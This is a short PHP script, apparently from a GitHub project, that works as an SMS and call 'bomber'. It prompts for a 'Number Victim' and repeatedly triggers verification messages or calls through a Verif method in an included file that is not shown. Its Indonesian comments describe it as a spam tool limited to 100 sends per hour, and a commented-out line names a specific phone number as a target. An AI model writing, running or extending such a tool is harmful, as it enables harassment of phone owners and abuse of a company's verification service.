<?php
include 'func.php';

/*
    https://github.com/nee48/BomTelpSmsTokped
    Made by Handika Pratama
*/

$init = new Bom();

//Eksekusi Call/Sms Boomber (Limit 100x/Jam)

echo "</> Number Victim : ";
$a = trim(fgets(STDIN));
$init->no = "$a";
echo "</> Select 1 or 2 : ";
$b = trim(fgets(STDIN));
$init->type = "$b"; //Type 2 untuk telpon, Type 1 untuk sms
//$init->no = "0895371761108"; //Nomer Hp tujuan
echo"Note* Type 1 For SMS, Type 2  For Spam Call"; 

if ($init->type == 1) {
	for ($i=0; $i < 2; $i++) { 
	    $init->Verif($init->no,$init->type);
	}
}elseif ($init->type == 2) {
	 $init->Verif($init->no,$init->type);
}
